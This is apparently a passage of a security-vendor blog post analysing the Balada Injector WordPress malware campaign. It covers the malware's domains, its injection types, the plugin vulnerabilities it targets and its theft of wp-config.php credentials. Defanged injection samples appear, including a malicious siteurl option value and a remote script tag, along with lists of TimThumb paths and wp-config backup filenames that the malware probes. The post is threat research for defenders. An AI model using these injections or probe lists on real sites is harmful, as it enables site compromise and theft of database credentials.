	<li id="menu-item-19915" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-19915"><a href="https://sucuri.net/partners/" itemprop="url"><span itemprop="name">Partners</span></a></li>
	<li id="menu-item-20816" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20816"><a href="https://sucuri.net/referral/" itemprop="url"><span itemprop="name">Referral Program</span></a></li>
	<li id="menu-item-19914" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-19914"><a href="https://sucuri.net/ecommerce-website-security/" itemprop="url"><span itemprop="name">Ecommerce</span></a></li>
</ul>
</li>
<li id="menu-item-20817" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-20817"><a href="https://sucuri.net/guides/" itemprop="url"><span itemprop="name">Resources</span></a>
<ul class="sub-menu">
	<li id="menu-item-20818" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20818"><a href="https://sucuri.net/guides/" itemprop="url"><span itemprop="name">Guides</span></a></li>
	<li id="menu-item-20819" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20819"><a href="https://sucuri.net/webinars/" itemprop="url"><span itemprop="name">Webinars</span></a></li>
	<li id="menu-item-20820" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20820"><a href="https://sucuri.net/infographics/" itemprop="url"><span itemprop="name">Infographics</span></a></li>
	<li id="menu-item-20821" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20821"><a href="https://sitecheck.sucuri.net/" itemprop="url"><span itemprop="name">SiteCheck</span></a></li>
	<li id="menu-item-20822" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-20822"><a href="https://sucuri.net/reports/" itemprop="url"><span itemprop="name">Reports</span></a></li>
	<li id="menu-item-22570" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-22570"><a href="https://sucuri.net/email-courses/" itemprop="url"><span itemprop="name">Email Courses</span></a></li>
</ul>
</li>
<li id="menu-item-17506" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-17506"><a href="https://sucuri.net/website-security-platform/help-now" itemprop="url"><span itemprop="name">Immediate Help</span></a></li>
<li id="menu-item-17509" class="menu-item-login menu-item menu-item-type-custom menu-item-object-custom menu-item-17509"><a href="https://dashboard.sucuri.net/login/" itemprop="url"><span itemprop="name">Login</span></a></li>
</ul></nav><button id="responsive-menu" role="button" aria-controls="genesis-nav-primary" aria-pressed="false"><span class="screen-reader-text">Menu</span></button></div></header><div class="site-inner"><div class="wrap"><div class="content-sidebar-wrap"><main class="content" id="genesis-content"><article class="post-31057 post type-post status-publish format-standard has-post-thumbnail category-website-malware-infections category-website-security category-wordpress-security tag-balada-injector tag-black-hat-tactics tag-hacked-websites tag-malware tag-obfuscation tag-redirects-2 tag-wordpress-plugins-and-themes entry"><header class="entry-header"><div class="single-featured"><img width="745" height="350" src="https://blog.sucuri.net/wp-content/uploads/2023/04/23-BlogPost_Feature-Image_1490x700_Balada-Injector-745x350.jpg" class="single-featured-image wp-post-image" alt="Balada Injector: Synopsis of a Massive Ongoing WordPress Malware Campaign" decoding="async" loading="lazy" srcset="https://blog.sucuri.net/wp-content/uploads/2023/04/23-BlogPost_Feature-Image_1490x700_Balada-Injector-745x350.jpg 745w, https://blog.sucuri.net/wp-content/uploads/2023/04/23-BlogPost_Feature-Image_1490x700_Balada-Injector-600x282.jpg 600w, https://blog.sucuri.net/wp-content/uploads/2023/04/23-BlogPost_Feature-Image_1490x700_Balada-Injector-650x306.jpg 650w, https://blog.sucuri.net/wp-content/uploads/2023/04/23-BlogPost_Feature-Image_1490x700_Balada-Injector-768x361.jpg 768w, https://blog.sucuri.net/wp-content/uploads/2023/04/23-BlogPost_Feature-Image_1490x700_Balada-Injector-585x275.jpg 585w, https://blog.sucuri.net/wp-content/uploads/2023/04/23-BlogPost_Feature-Image_1490x700_Balada-Injector-560x263.jpg 560w, https://blog.sucuri.net/wp-content/uploads/2023/04/23-BlogPost_Feature-Image_1490x700_Balada-Injector.jpg 1491w" sizes="(max-width: 745px) 100vw, 745px" /></div><h1 class="entry-title">Balada Injector: Synopsis of a Massive Ongoing WordPress Malware Campaign</h1>
<p class="entry-meta"><time class="entry-time" datetime="2023-04-06T12:25:11-07:00">April 6, 2023</time><span class="entry-author"><a href="https://blog.sucuri.net/author/denis" class="entry-author-link" rel="author"><span class="entry-author-name">Denis Sinegubko</span></a></span></p></header><div class="entry-content"><aside class="mashsb-container mashsb-main mashsb-stretched"><div class="mashsb-box"><div class="mashsb-buttons"><a class="mashicon-facebook mash-small mash-center mashsb-shadow" href="https://www.facebook.com/sharer.php?u=https%3A%2F%2Fblog.sucuri.net%2F2023%2F04%2Fbalada-injector-synopsis-of-a-massive-ongoing-wordpress-malware-campaign.html" target="_top" rel="nofollow"><span class="icon"></span><span class="text">Facebook</span></a><a class="mashicon-twitter mash-small mash-center mashsb-shadow" href="https://twitter.com/intent/tweet?text=Balada%20Injector%3A%20Synopsis%20of%20a%20Massive%20Ongoing%20WordPress%20Malware%20Campaign&amp;url=https://blog.sucuri.net/2023/04/balada-injector-synopsis-of-a-massive-ongoing-wordpress-malware-campaign.html&amp;via=sucurisecurity" target="_top" rel="nofollow"><span class="icon"></span><span class="text">Twitter</span></a><a class="mashicon-subscribe mash-small mash-center mashsb-shadow" href="#" target="_top" rel="nofollow"><span class="icon"></span><span class="text">Subscribe</span></a><div class="onoffswitch2 mash-small mashsb-shadow" style="display:none"></div></div>
            </div>
                <div style="clear:both"></div></aside>
            <!-- Share buttons by mashshare.net - Version: 3.8.8--><p>Our team at Sucuri has been tracking a <a href="https://blog.sucuri.net/2017/09/old-themes-abandoned-scripts-pitfalls-cleaning-serialized-data.html">massive WordPress infection campaign since 2017</a> — but up until recently never bothered to give it a proper name. Typically, we refer to it as an ongoing long lasting massive WordPress infection campaign that leverages all known and recently discovered theme and plugin vulnerabilities. Other organizations and blogs have described it in a similar manner, sometimes adding terms like “malvertising campaign” or naming domains that it was currently used (which amounts to several hundred over the past 6 years).</p>
<p>This campaign is easily identified by its preference for <b>String.fromCharCode</b> obfuscation, the use of freshly registered domain names hosting malicious scripts on random subdomains, and by redirects to various scam sites including <a href="https://blog.sucuri.net/2018/10/multiple-ways-to-inject-the-same-tech-support-scam-malware.html">fake tech support</a>, fraudulent lottery wins, and more recently, <a href="https://blog.sucuri.net/2019/04/from-tk-redirects-to-pushka-browser-notification-scam.html">push notification scams</a> displaying bogus captcha pages asking users to “Please Allow to verify, that you are not a robot”.</p>
<figure id="attachment_31058" aria-describedby="caption-attachment-31058" style="width: 828px" class="wp-caption aligncenter"><a href="https://blog.sucuri.net/wp-content/uploads/2023/04/balada_injector_charcode.png"><img decoding="async" loading="lazy" class="wp-image-31058 size-full" src="https://blog.sucuri.net/wp-content/uploads/2023/04/balada_injector_charcode.png" alt="Typical injection and redirect destination for Balada Injector with charcode and please allow to verify you are not a robot" width="828" height="947" srcset="https://blog.sucuri.net/wp-content/uploads/2023/04/balada_injector_charcode.png 828w, https://blog.sucuri.net/wp-content/uploads/2023/04/balada_injector_charcode-525x600.png 525w, https://blog.sucuri.net/wp-content/uploads/2023/04/balada_injector_charcode-568x650.png 568w, https://blog.sucuri.net/wp-content/uploads/2023/04/balada_injector_charcode-768x878.png 768w, https://blog.sucuri.net/wp-content/uploads/2023/04/balada_injector_charcode-560x640.png 560w" sizes="(max-width: 828px) 100vw, 828px" /></a><figcaption id="caption-attachment-31058" class="wp-caption-text">Typical injection and redirect destination for Balada Injector</figcaption></figure>
<p>Since 2017, we estimate that over one million WordPress websites have been infected by this campaign. Each year it consistently ranks in the top 3 of the infections that we detect and clean from compromised websites. You can see results from our latest <a href="https://sucuri.net/reports/2022-hacked-website-report/">website threat report.</a></p>
<p>In 2022 alone, our external website scanner SiteCheck detected this malware over<b> 141,000</b> times, with more than<b> 67% </b>of websites with blocklisted resources loading scripts from known Balada Injector domains. We currently have more than <b>100</b> signatures covering both front-end and back-end variations of the malware injected into server files and WordPress databases.</p>
<p>As you can imagine, referring to this massive infection campaign using generic terms has not been extremely convenient. However, assigning a name to this malware was never at the top of our priority list. Our security researchers deal with dozens of new malware samples every day, so we typically don’t dwell too much on well-known malware that is adequately covered by detection rules and only necessitates minor adjustments when we spot a new wave.</p>
<p>&nbsp;</p>
<h2>How Balada Injector got its name</h2>
<p>In late December 2022, our colleagues at <b>Dr.Web</b> shared some valuable information that led us to choose the name “<b>Balada Injector</b>”.</p>
<p>A post published on December 30, 2022, titled “<a href="https://news.drweb.com/show/?i=14646&amp;lng=en&amp;c=23">Linux backdoor malware infects WordPress-based websites</a>” caught our attention, and it was widely circulated in Internet security blogs with titles like “Linux Malware uses 30 plugin vulnerabilities to target WordPress sites”. The article discusses two variants of the malware: <a href="https://vms.drweb.com/virus/?i=25604695">Linux.BackDoor.WordPressExploit.1</a> and <a href="https://vms.drweb.com/virus/?i=25604745">Linux.BackDoor.WordPressExploit.2</a> and provides a comprehensive overview, including targeted plugins and various indicators of compromise.</p>
<p>The interest generated by this information prompted numerous inquiries from various sources, leading me to examine the post closely on New Year&#8217;s Eve to determine if immediate action was required. To my surprise, I instantly recognized the described malware as the ongoing, massive campaign we&#8217;d been tracking. Upon closer inspection, I found that the information provided was accurate, but the vulnerabilities, injected code, and malicious domains all dated back to 2019 and 2020.</p>
<p>Nevertheless, the post offered interesting details about how campaign operators searched for vulnerable websites and injected malware. We soon obtained samples of the Linux binaries written in Go language from VirusTotal, where other security researchers created collections like <a href="https://www.virustotal.com/gui/collection/b6a9a5788171c4fdfaf318c5d1462c98ab77f47624d47ecde6b4c8c7fdb47c68">this</a>.</p>
<figure id="attachment_31059" aria-describedby="caption-attachment-31059" style="width: 1062px" class="wp-caption aligncenter"><img decoding="async" loading="lazy" class="size-full wp-image-31059" src="https://blog.sucuri.net/wp-content/uploads/2023/04/linux_malware_virustotal_collection.png" alt="Linus Malware Exploits 30 plugins into WordPress websites virustotal collection for Balada Injector" width="1062" height="629" srcset="https://blog.sucuri.net/wp-content/uploads/2023/04/linux_malware_virustotal_collection.png 1062w, https://blog.sucuri.net/wp-content/uploads/2023/04/linux_malware_virustotal_collection-600x355.png 600w, https://blog.sucuri.net/wp-content/uploads/2023/04/linux_malware_virustotal_collection-650x385.png 650w, https://blog.sucuri.net/wp-content/uploads/2023/04/linux_malware_virustotal_collection-768x455.png 768w, https://blog.sucuri.net/wp-content/uploads/2023/04/linux_malware_virustotal_collection-560x332.png 560w" sizes="(max-width: 1062px) 100vw, 1062px" /><figcaption id="caption-attachment-31059" class="wp-caption-text">VirusTotal collection</figcaption></figure>
<p>Most of the samples were compiled with debug information and even a simple “strings” command provided quite insightful information: names of functions, string constants, paths of files included in the project.</p>
<p>These included file paths inspired us to finally name the malware campaign. A typical list of linked files for most of the samples look like this:</p>
<pre class="code_syntax" style="color: #d1d1d1; background: #000000;"><span style="color: #99cc00;"><span class="line_wrapper">C:/Users/host/Desktop/<strong><span style="color: #33cccc;">balada</span></strong>/client/rlimit.go</span>
<span class="line_wrapper">C:/Users/host/Desktop/<strong><span style="color: #33cccc;">balada</span></strong>/client/main.go</span>
<span class="line_wrapper">C:/Users/host/go/src/github.com/go-sql-driver/mysql/fields.go</span>
<span class="line_wrapper">C:/Users/host/go/src/github.com/go-sql-driver/mysql/collations.go</span>
<span class="line_wrapper">C:/Users/host/go/src/github.com/go-sql-driver/mysql/transaction.go</span>
<span class="line_wrapper">C:/Users/host/go/src/github.com/go-sql-driver/mysql/statement.go</span>
<span class="line_wrapper">C:/Users/host/go/src/github.com/go-sql-driver/mysql/result.go</span>
<span class="line_wrapper">C:/Users/host/go/src/github.com/go-sql-driver/mysql/rows.go</span>
<span class="line_wrapper">C:/Users/host/go/src/github.com/go-sql-driver/mysql/packets.go</span>
<span class="line_wrapper">C:/Users/host/go/src/github.com/go-sql-driver/mysql/infile.go</span>
<span class="line_wrapper">C:/Users/host/go/src/github.com/go-sql-driver/mysql/errors.go</span>
<span class="line_wrapper">C:/Users/host/go/src/github.com/go-sql-driver/mysql/dsn.go</span>
<span class="line_wrapper">C:/Users/host/go/src/github.com/go-sql-driver/mysql/driver.go</span>
<span class="line_wrapper">C:/Users/host/go/src/github.com/go-sql-driver/mysql/utils.go</span>
<span class="line_wrapper">C:/Users/host/go/src/github.com/go-sql-driver/mysql/connection.go</span>
<span class="line_wrapper">C:/Users/host/go/src/github.com/go-sql-driver/mysql/buffer.go</span>
<span class="line_wrapper">C:/Users/host/go/src/github.com/go-sql-driver/mysql/auth.go</span>
<span class="line_wrapper">c:/go/src/database/sql/sql.go</span>
<span class="line_wrapper">c:/go/src/database/sql/ctxutil.go</span>
<span class="line_wrapper">c:/go/src/database/sql/convert.go</span>
<span class="line_wrapper">c:/go/src/database/sql/driver/driver.go</span>
<span class="line_wrapper">c:/go/src/strconv/atob.go</span>
<span class="line_wrapper">c:/go/src/database/sql/driver/types.go</span>
<span class="line_wrapper">C:/Users/host/go/src/gopkg.in/dutchcoders/goftp.v1/status.go</span>
<span class="line_wrapper">C:/Users/host/go/src/gopkg.in/dutchcoders/goftp.v1/ftp.go</span></span>
<span class="line_wrapper" style="color: #999999;">…
</span><span class="line_wrapper"><span style="color: #33cccc;">…</span><span style="color: #00c4c4;">a</span> <span style="color: #00c4c4;">few</span> <span style="color: #00c4c4;">hundred</span> <span style="color: #00c4c4;">more</span> <span style="color: #00c4c4;">linked</span> <span style="color: #00c4c4;">files</span> <span style="color: #00c4c4;">omitted…</span></span></pre>
<p>These files consist mostly of source code for various Go libraries, providing additional functionality such as conversion functions and support for Internet protocols. However, the main malware code was located in the file <b>C:/Users/host/Desktop</b><b>/balada</b><b>/client/main.go</b>. The file path <b>balada/client</b> implied that the developer could refer to this software as <b>Balada Client</b> (we know that the malware sends data to C2 server so there could be a Balada Server part too).</p>
<p>Whether our assumptions were correct or not, we adopted this name internally and think that it provides some convenience when talking about a really long lasting malware campaign.</p>
<p>In many languages, Balada means “Ballad”. To avoid ambiguity, we added the word Injector to reflect the nature of the malware campaign that injects malicious code into WordPress sites, hence <b>Balada Injector</b>.</p>
<p>Now that we’ve shared the story of how the malware campaign got its name, let’s take a look at the most common techniques and functionalities used in the Balada Injector campaign.</p>
<p><strong>Contents:</strong></p>
<ul>
<li aria-level="1"><strong><a href="#infection-waves">Infection waves</a></strong></li>
<li aria-level="1"><strong><a href="#domain-names">Domain names and reinfections</a></strong></li>
<li aria-level="1"><strong><a href="#attack-vectors">Attack vectors vs injection types</a></strong></li>
<li aria-level="1"><strong><a href="#vulnerabilities">WordPress component vulnerabilities</a></strong></li>
<li aria-level="1"><strong><a href="#database-credential-theft">Database credential theft</a></strong></li>
<li aria-level="1"><strong><a href="#archives-database-dumps">Archives and database dumps</a></strong></li>
<li aria-level="1"><strong><a href="#logs">Miscellaneous logs and scripts</a></strong></li>
<li aria-level="1"><strong><a href="#data-collection">Assorted data collection</a></strong></li>
<li aria-level="1"><strong><a href="#brute-force">Brute force</a></strong></li>
<li aria-level="1"><strong><a href="#backdoors">Backdoors</a></strong></li>
<li aria-level="1"><strong><a href="#cross-site-infections">Cross-site infections</a></strong></li>
<li aria-level="1"><a href="#client-hosts-C2-servers"><strong>Client hosts &amp; C2 servers</strong></a></li>
</ul>
<h2 id="infection-waves">Infection waves</h2>
<p>During the many years of Balada Injector’s operation, we have observed consistent patterns of infection waves on a pretty regular basis. These waves tended to occur every couple of weeks, sometimes once a month. We typically notice an uptick in infected websites by Tuesday, following a wave’s initiation during the weekend.</p>
<p>The period between the waves is probably utilized for gathering and testing newly reported and 0-day vulnerabilities, as well as for developing new attack routines.</p>
<p>Each wave can be identified by a new, freshly registered domain name that the campaign uses in its injections. Most of these domain names are a nonsense combination of two-four English words, such as <b>sometimesfree[.]biz</b>, <b>destinyfernandi[.]com</b>,<b> travelfornamewalking[.]ga</b>, or <b>statisticline[.]com</b>. The actual injections employ URLs on various subdomains of the current wave domain, for example:</p>
<ul>
<li aria-level="1">java.sometimesfree[.]biz/counter.js &#8211; active 2017</li>
<li aria-level="1">slow.destinyfernandi[.]com/slow.js &#8211; active 2020</li>
<li aria-level="1">main.travelfornamewalking[.]ga/stat.js &#8211; active 2021</li>
<li aria-level="1">cdn.statisticline[.]com/scripts/sway.js &#8211; active 2023</li>
</ul>
<p>It’s worth noting that 32 domains associated with different waves of the Balada Injector malware campaign accounted for <b>67.2%</b> of all SiteCheck’s blocklisted resource detections in 2022, fully occupying the top 5 list.</p>
<table>
<tbody>
<tr>
<td style="text-align: center;" colspan="2">
<h4 style="padding-top: 15px;"><b>Top Blocklisted Resources &#8211; 2022</b></h4>
</td>
</tr>
<tr>
<td><b>Blocklisted Domain</b></td>
<td><b># of Detections</b></td>
</tr>
<tr>
<td>legendarytable[.]com</td>
<td>18,102</td>
</tr>
<tr>
<td>weatherplllatform[.]com</td>
<td>13,133</td>
</tr>
<tr>
<td>classicpartnerships[.]com</td>
<td>10,726</td>
</tr>
<tr>
<td>ads.specialadves[.]com</td>
<td>8,295</td>
</tr>
<tr>
<td>line.storerightdesicion[.]com</td>
<td>7,899</td>
</tr>
</tbody>
</table>
<h3 id="domain-names" style="padding-top: 15px;">Domain names and reinfections</h3>
<p>Throughout the years we’ve observed well over a hundred domain names used by Balada Injector.</p>
<p>In one of the analyzed binaries, we found a function called “<b>main.ex_domains</b>” that listed <b>70</b> domain names previously used by the campaign. However, even for 2020, this list was far from exhaustive, mainly containing domains from 2019-2020 and missing domain names that were used before 2019:</p>
<table>
<tbody>
<tr>
<td>trackstatisticsss[.]com<br />
accongestion[.]com<br />
actraffic[.]com<br />
admarketlocation[.]com<br />
adsforbusines[.]com<br />
adsformarket[.]com<br />
adsrequestbest[.]com<br />
adtrafficjam[.]com<br />
backrocklondon[.]com<br />
balanceformoon[.]com<br />
balanceforsun[.]com<br />
balantfromsun[.]com<br />
becausenightisbetter[.]com<br />
becauseshineisbetter[.]com<br />
beforwardplay[.]com<br />
belaterbewasthere[.]com<br />
belazyelephant[.]com<br />
belighterservice[.]com<br />
bluelabelmoscow[.]com<br />
bullgoesdown[.]com<br />
buycongestion[.]com<br />
buyittraffic[.]com<br />
carlbendergogo[.]com<br />
chatwithgreenbar[.]com</td>
<td>collectfasttracks[.]com<br />
costsimpleplay[.]com<br />
createrelativechanging[.]com<br />
cuttraffic[.]com<br />
dancewithlittleredpony[.]com<br />
deliverblackjohn[.]com<br />
denzzzelwashington[.]com<br />
destinyfernandi[.]com<br />
dexterfortune[.]com<br />
donaldbackinsky[.]com<br />
followmyfirst1[.]com<br />
generallocationgo[.]com<br />
giantttraffic[.]com<br />
globallyreinvation[.]com<br />
gotosecond2[.]com<br />
greenlabelfrancisco[.]com<br />
greenrelaxfollow[.]com<br />
importtraffic[.]com<br />
jockersunface[.]com<br />
letsmakesomechoice[.]com<br />
lightversionhotel[.]com<br />
littleandbiggreenballlon[.]com<br />
makesomethird3[.]com<br />
postertraffic[.]com</td>
<td>primarylocationgo[.]com<br />
privacylocationforloc[.]com<br />
puttraffic[.]com<br />
redfunchicken[.]com<br />
redlabellondon[.]com<br />
redrelaxfollow[.]com<br />
requestfor4[.]com<br />
resolutiondestin[.]com<br />
speakwithjohns[.]com<br />
specialthankselsa[.]com<br />
startrafficc[.]com<br />
stivenfernando[.]com<br />
talktofranky[.]com<br />
toupandgoforward[.]com<br />
trafficlmedia[.]com<br />
trasnaltemyrecords[.]com<br />
traveltoscount[.]com<br />
verybeatifulantony[.]com<br />
wiilberedmodels[.]com<br />
worldctraffic[.]com<br />
yellowlabeltokyo[.]com<br />
digestcolect[.]com</td>
</tr>
</tbody>
</table>
<p>The purpose of this list is to identify already infected sites and reinfect them without leaving multiple concurrent types of injection on the same site.</p>
<p>&nbsp;</p>
<h2 id="attack-vectors">Attack vectors vs injection types</h2>
<p>However, as we’ll see shortly, this approach didn’t work well for Balada Injector. The main problem is it tried to be an universal injector for WordPress, going after all major vulnerabilities and attack vectors. However, each vulnerability is different and allows different levels of access to compromised sites which resulted in many different types of injections even within one wave.</p>
<h3 style="padding-top: 15px;">Siteurl hacks</h3>
<p>For example, some vulnerabilities only allowed the modification of arbitrary WordPress options, which resulted in so-called <a href="https://blog.sucuri.net/2018/11/erealitatea-net-hack-corrupts-websites-with-wp-gdpr-compliance-plugin-vulnerability.html">siteurl infections</a> (you can see an example of an attack on a vulnerable <a href="https://blog.sucuri.net/2019/03/multi-vector-attack-in-server-logs.html">version of WordPress GDPR Compliance plugin back in 2019 here</a>). In this case, WordPress itself will start loading all resources such as styles and scripts from malicious URLs and you don’t have much control over it.</p>
<pre class="code_syntax" style="white-space: pre-wrap; color: #d1d1d1; background: #000000;"><span class="line_wrapper" style="color: #ede8e8;">a:2:{s:4:"<span style="color: #33cccc;">data</span>";s:126:"a:2:{s:7:"<span style="color: #33cccc;">siteurl</span>";s:41:"<span style="color: #99cc00;">hxxps://gabriellalovecats[.]com</span>/<span style="color: #33cccc;">a.js?a1=b1&amp;</span>";s:4:"<span style="color: #33cccc;">home</span>";s:38:"<span style="color: #99cc00;">hxxps://gabriellalovecats[.]com/a?a2=b2&amp;</span>";}";s:8:"<span style="color: #33cccc;">checksum</span>";s:32:"<span style="color: #33cccc;">02dfdfda2e159b6f1bd04f94a9e4322f</span>";}</span></pre>
<h3 style="padding-top: 15px;">HTML injections</h3>
<p>In some cases, a vulnerability may allow the injection of custom HTML code into a plugin’s or a theme’s option. For this specific type of vulnerability, hackers can choose what type of JavaScript injection they want to use. It can be a plain script tag with a remote src parameter like the one below:</p>
<pre class="code_syntax" style="color: #d1d1d1; background: #000000;"><span class="line_wrapper"><span style="color: #d2cd86;">&lt;</span>script type<span style="color: #d2cd86;">=</span><span style="color: #02d045;">'</span><span style="color: #00c4c4;">text/javascript</span><span style="color: #02d045;">'</span> src<span style="color: #d2cd86;">=</span><span style="color: #02d045;">'</span><span style="color: #00c4c4;">hxxps://port.transandfiestas[.]ga/stat.js?stat=debug</span><span style="color: #02d045;">'</span><span style="color: #d2cd86;">&gt;</span><span style="color: #d2cd86;">&lt;</span><span style="color: #d2cd86;">/</span>script<span style="color: #d2cd86;">&gt;</span></span></pre>
<p>Or a longer inline obfuscated script. This vulnerability also doesn’t provide any other type of access to the site &#8211; attackers can only change one thing and hope the vulnerability is not closed by the webmaster.</p>
<p>To gain more access to the site, injected scripts often contain code that tries to attack logged-in administrators of infected sites, making their browsers silently execute commands in the WordPress admin interface such as creating new admin users or injecting backdoors into theme files.</p>
<h3 style="padding-top: 15px;">Database injections</h3>
<p>Another level of control can be achieved if hackers steal WordPress database credentials from <b>wp-config.php</b> (more about it later), allowing attackers to then inject malware into all published WordPress posts and pages. Additionally, attackers may also create malicious admin users, which potentially gives them access to the whole server account as they can modify theme files and install any plugins.</p>
<h3 style="padding-top: 15px;">Arbitrary file injections</h3>
<p>Some severe vulnerabilities allow attackers to upload arbitrary files to compromised servers or execute arbitrary PHP code. For Balada Injector, this is a a prime opportunity to plant a backdoor that will be used for site infection, usually in a form of PHP injections into core WordPress files, JavaScript injections into<b> .js </b>files (usually the ones with <b>jquery </b>in their names), and HTML injections into <b>.html</b> files. Quite often attackers increase their footprint by adding malicious WordPress admin users and injecting malware into a database.</p>
<h3 style="padding-top: 15px;">Flawed reinfections</h3>
<p>As you can see, the situation becomes complicated quite quickly. Add to this the fact that almost every infection wave involved slightly altered obfuscation methods. It goes without saying that maintaining so many types of injections for an extended period inevitably leads to things not going as planned.</p>
<p>Furthermore, we frequently find multiple injections representing different waves on the same site, sometimes even duplicated. For example, on this page (<a href="https://urlscan.io/responses/416b3163860c4f2aa7fc6114832482d42311b1ee581af1c05fb3eef1bfb0cb5c/">URLScan.io cache</a>) <b>11</b> distinct malicious Balada scripts were injected <b>311</b> times!</p>
<figure id="attachment_31060" aria-describedby="caption-attachment-31060" style="width: 1069px" class="wp-caption aligncenter"><a href="https://blog.sucuri.net/wp-content/uploads/2023/04/balada_injection_scripts.png"><img decoding="async" loading="lazy" class="wp-image-31060 size-full" src="https://blog.sucuri.net/wp-content/uploads/2023/04/balada_injection_scripts.png" alt="Hundreds of malicious Balada Injector scripts injected into the same web page" width="1069" height="529" srcset="https://blog.sucuri.net/wp-content/uploads/2023/04/balada_injection_scripts.png 1069w, https://blog.sucuri.net/wp-content/uploads/2023/04/balada_injection_scripts-600x297.png 600w, https://blog.sucuri.net/wp-content/uploads/2023/04/balada_injection_scripts-650x322.png 650w, https://blog.sucuri.net/wp-content/uploads/2023/04/balada_injection_scripts-768x380.png 768w, https://blog.sucuri.net/wp-content/uploads/2023/04/balada_injection_scripts-560x277.png 560w" sizes="(max-width: 1069px) 100vw, 1069px" /></a><figcaption id="caption-attachment-31060" class="wp-caption-text">Hundreds of Balada scripts injected into the same web page</figcaption></figure>
<p>Now, let’s discuss the attack approaches used by Balada Injector.</p>
<p>&nbsp;</p>
<h2 id="vulnerabilities">Targeting WordPress component vulnerabilities</h2>
<p>First of all, all sorts of vulnerabilities in WordPress themes and plugins can allow an attacker to inject code or gain unauthorized access to the website — which can eventually be escalated to the level where code injections are possible.</p>
<p>Back in 2017 when we started tracking this campaign, one of the most prominent vulnerabilities that they abused were old security bugs in <a href="https://blog.sucuri.net/2018/08/massive-wordpress-redirect-campaign-targets-vulnerable-tagdiv-themes-and-ultimate-member-plugins.html">tagDiv’s Newspaper/Newsmag themes</a>. This entire time, Balada Injector has been quickly adding newly disclosed vulnerabilities (and sometimes undisclosed 0-days), occasionally starting massive waves of infections within a few hours after vulnerability disclosures. The most recent wave of Balada injections <a href="https://blog.sucuri.net/2023/03/high-severity-vulnerability-in-wordpress-elementor-pro-patched.html">targeted a recently patched security flaw in the Elementor Pro plugin</a>.</p>
<p>Between 2019 and 2020, we tried to <a href="https://blog.sucuri.net/2019/11/plugins-added-to-malware-campaign-october-2019.html">track new vulnerabilities targeted by the Balada Injector</a> along with the domain names it used in its injections. Every month, we saw a number of newly disclosed vulnerabilities added to the campaign on a regular basis.</p>
<p>Older vulnerabilities were not immediately discarded after initial rounds of infections and some of them remained in use for a long time after the patches were released.</p>
<p>It was interesting to discover that the 2020 version of the binary Balada Injector client still had 8 predefined paths for a <a href="https://blog.sucuri.net/2019/08/timthumb-attacks-the-scale-of-legacy-malware-infections.html">really old TimThumb vulnerability</a> that originated in 2011.</p>
<pre class="code_syntax" style="color: #d1d1d1; background: #000000;"><span class="line_wrapper">/wp-content/themes/<span style="color: #99cc00;">learndash/timthumb.php</span></span>
<span class="line_wrapper">/wp-content/themes/<span style="color: #99cc00;">Pilgrim/timthumb.php</span></span>
<span class="line_wrapper">/wp-content/plugins/image-slider-widget/inc/class/<span style="color: #99cc00;">timthumb.php</span>
/wp-content/themes/Revera/<span style="color: #99cc00;">timthumb.php</span>
/wp-content/themes/<span style="color: #99cc00;">Viper/timthumb.php</span></span>
<span class="line_wrapper">/wp-content/plugins/<span style="color: #99cc00;">ACK/timthumb.php</span></span>
<span class="line_wrapper">/wp-content/plugins/<span style="color: #99cc00;">whitespace-image-resize/timthumb.php</span></span>
<span class="line_wrapper">/wp-content/themes/suco/<span style="color: #99cc00;">themify/img.php</span></span></pre>
<p>Another interesting discovery was that in 2023 various versions of the<b> timthumb.php</b> script, which has not been maintained since 2014, are reported to be used on <a href="https://publicwww.com/websites/%22timthumb.php%22/">over 70,000 sites</a>.</p>
<p>&nbsp;</p>
<h2 id="database-credential-theft">Hunting for database credentials</h2>
<p>Vulnerabilities are always being discovered and patched, but unfortunately database passwords are rarely changed after a compromise — so if an attacker gets their hands on some database creds, they have the chance to retain access to a WordPress site even if the previously exploited vulnerability is patched, backdoor files are removed, and malicious WordPress admin users are deleted.</p>
<p>As most admins know, WordPress stores database credentials in the <b>wp-config.php</b> file. So, this is the file that hackers are<i> especially</i> interested in during different stages of attack. If the site is not compromised yet, they use various tricks to obtain contents of <b>wp-config.php</b>. And if it’s already compromised, they read it to save the credentials for future use.</p>
<p>For example, in one version of the binary Balada Injector client, we found the <b>main.links2</b> and <b>main.links3</b> functions that together contained <b>122</b> different ways to steal <b>wp-config.ph</b>p data that comprised mostly of two major approaches:</p>
<ol>
<li aria-level="1">Use known vulnerabilities that allows to read or download arbitrary site files:<br />
<a href="https://blog.sucuri.net/wp-content/uploads/2023/04/balada_injector_known_vulnerabilities.png"><img decoding="async" loading="lazy" class="aligncenter wp-image-31061 size-full" src="https://blog.sucuri.net/wp-content/uploads/2023/04/balada_injector_known_vulnerabilities.png" alt="Known vulnerabilities allowing Balada Injector to read or download arbitrary website files" width="1068" height="323" srcset="https://blog.sucuri.net/wp-content/uploads/2023/04/balada_injector_known_vulnerabilities.png 1068w, https://blog.sucuri.net/wp-content/uploads/2023/04/balada_injector_known_vulnerabilities-600x181.png 600w, https://blog.sucuri.net/wp-content/uploads/2023/04/balada_injector_known_vulnerabilities-650x197.png 650w, https://blog.sucuri.net/wp-content/uploads/2023/04/balada_injector_known_vulnerabilities-768x232.png 768w, https://blog.sucuri.net/wp-content/uploads/2023/04/balada_injector_known_vulnerabilities-560x169.png 560w" sizes="(max-width: 1068px) 100vw, 1068px" /></a></li>
<li aria-level="1">Or search for backup files with extensions that allow downloading:</li>
</ol>
<pre class="code_syntax" style="color: #d1d1d1; background: #000000;"><span class="line_wrapper">…</span>
<span style="color: #99cc00;"><span class="line_wrapper">/wp-config-backup.txt</span>
<span class="line_wrapper">/wp-config.bak/wp-config.inc</span>
<span class="line_wrapper">/wp-config.old</span>
<span class="line_wrapper">/wp-config.orig</span>
<span class="line_wrapper">/wp-config.original</span>
<span class="line_wrapper">/wp-config.php.1</span>
<span class="line_wrapper">/wp-config.php.bak</span>
<span class="line_wrapper">/wp-config.php.old</span>
<span class="line_wrapper">/wp-config.php.orig</span>
<span class="line_wrapper">/wp-config.php.original</span>
